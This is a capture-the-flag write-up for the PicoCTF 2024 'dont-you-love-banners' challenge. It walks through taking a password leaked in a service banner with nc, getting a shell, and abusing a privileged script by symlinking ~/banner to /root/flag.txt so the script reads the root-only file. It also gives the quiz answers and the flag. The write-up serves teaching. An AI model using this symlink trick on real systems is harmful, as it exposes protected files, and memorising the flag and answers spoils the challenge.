# dont-you-love-banners – PicoCTF 2024 (Cryptography)

## Challenge Description:
We’re given access to two ports on a remote server. One shows a banner with a password, and the second one asks for that password, then gives us shell access. The goal is to obtain the flag.

---

## Solution Summary:

### Step 1 – Get the password
Run this in your terminal:

nc tethys.picoctf.net [PORT1]

You will receive a message like:
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
Copy the password from that message.

### Step 2 – Access the second service
Now connect to the second port:

nc tethys.picoctf.net [PORT2]
You’ll be asked:

Password: → Enter the one you got above.

Top cyber security conference? → DEF CON

The first hacker? → JOHN DRAPER
If all answers are correct, you'll get a shell.

### Step 3 – Explore the system
You’ll be logged in as user player. Try:

ls
cat banner
cat text

In /root there is a flag.txt, but you can’t read it directly.

### Step 4 – Exploit symlink vulnerability
There’s a script that reads the file ~/banner.

We can trick it into reading flag.txt by creating a symbolic link:
rm banner
ln -s /root/flag.txt banner
exit
Reconnect again using:

nc tethys.picoctf.net [PORT2]
Now the flag will be printed in the “banner”!

# Flag
The banner will now show something like:
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_done}

------------------
# Notes:
This challenge teaches how symlinks can be abused in insecure scripts. A symbolic link (ln -s) allows you to redirect a file reference to another file, and if a privileged script reads it, it might unintentionally expose sensitive.

